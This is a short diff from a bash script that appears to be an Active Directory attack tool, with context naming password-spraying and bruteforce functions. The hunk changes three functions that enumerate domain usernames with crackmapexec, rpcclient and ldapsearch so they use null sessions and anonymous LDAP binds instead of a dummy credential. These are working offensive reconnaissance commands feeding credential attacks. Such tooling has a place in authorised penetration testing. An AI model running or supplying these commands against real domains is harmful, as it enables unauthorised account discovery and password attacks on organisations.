@@ -98,17 +98,17 @@ Password_Spraying()
 
 # Function to enumerate usernames using crackmapexec with credentials
 enumerate_crackmapexec_with_null_sess() {
-    crackmapexec smb "$1" --users -u "1" -p "" 2>/dev/null | awk '{print $5}' | awk -F "\\" '{print $2}' #awk -F "\\" '{if (NF > 1) print $2; else print $0}'
+    crackmapexec smb "$1" --users -u "" -p "" 2>/dev/null | awk '{print $5}' | awk -F "\\" '{print $2}' #awk -F "\\" '{if (NF > 1) print $2; else print $0}'
 }
 
 # Function to enumerate usernames using rpcclient with credentials
 enumerate_rpcclient_with_null_sess() {
-    rpcclient -U '1' -N -c enumdomusers "$1" 2>/dev/null | grep 'user:' | awk '{print $1}' | awk -F "[][]" '{print $2}'
+    rpcclient -U '' -N -c enumdomusers "$1" 2>/dev/null | grep 'user:' | awk '{print $1}' | awk -F "[][]" '{print $2}'
 }
 
 # Function to enumerate usernames using ldapsearch with credentials
 enumerate_ldapsearch_with_null_bind() {
-    ldapsearch -x -H "ldap://$1" -D "$2" -w "1" -b "$3" -s sub "(objectclass=user)" 'sAMAccountName' 2>/dev/null | grep "sAMAccountName:" | awk '{print $2}'
+    ldapsearch -x -H "ldap://$1" -D "" -w "" -b "$3" -s sub "(objectclass=user)" 'sAMAccountName' 2>/dev/null | grep "sAMAccountName:" | awk '{print $2}'
 }
 
 # Function to bruteforce a list of usernames
